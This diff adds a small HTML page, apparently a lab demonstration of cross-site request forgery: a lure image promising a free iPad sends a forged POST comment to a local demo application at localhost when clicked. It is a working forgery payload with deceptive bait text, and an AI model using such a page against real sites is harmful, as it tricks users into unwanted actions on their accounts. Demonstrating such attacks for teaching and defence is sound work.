@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+</head>
+<body>
+    <div>
+        <img id="btn" src="fb.png" alt="Like on Facebook" /> Like this page and win an iPad!
+    </div>
+    
+    <script type="text/javascript">
+        (function () {
+            var img = document.getElementById('btn');
+            img.addEventListener('click', function() {
+                var xhr = new XMLHttpRequest();
+                
+                xhr.open('POST', 'http://localhost:17024/Home/AddComment', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                
+                xhr.send('email=clickjacker%40somewhere.com&comments=no%20iPad%20for%20you!');
+            });
+        })();
+    </script>
+</body>
+</html>
